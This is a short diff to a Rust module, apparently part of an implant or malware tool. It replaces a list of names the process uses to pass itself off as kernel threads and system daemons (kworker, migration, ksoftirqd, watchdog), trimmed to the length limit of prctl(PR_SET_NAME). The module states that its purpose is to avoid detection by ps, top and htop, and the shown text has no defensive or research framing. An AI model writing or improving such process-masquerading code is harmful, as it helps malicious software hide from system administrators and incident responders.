@@ -4,18 +4,18 @@
 //! common system daemons. This helps avoid detection by process listing
 //! tools (ps, top, htop).
 
-/// Common process names to masquerade as
+/// Process names for masquerade — must be <=15 chars for prctl(PR_SET_NAME)
 pub const MASQUERADE_NAMES: &[&str] = &[
-    "[kworker/0:1-events]",
-    "[kworker/u8:2-flush]",
-    "[migration/0]",
-    "[rcu_preempt]",
-    "[irq/44-mei_me]",
-    "/usr/lib/systemd/systemd-journald",
-    "/usr/lib/systemd/systemd-resolved",
-    "/usr/sbin/cron",
-    "/usr/sbin/thermald",
-    "/usr/lib/accountsservice/accounts-daemon",
+    "kworker/0:1",
+    "kworker/u8:2",
+    "migration/0",
+    "rcu_preempt",
+    "irq/44-mei_me",
+    "ksoftirqd/0",
+    "kcompactd0",
+    "watchdog/0",
+    "scsi_eh_0",
+    "jbd2/sda1-8",
 ];
 
 /// Rewrite the process name visible in `ps` and `/proc/self/comm`
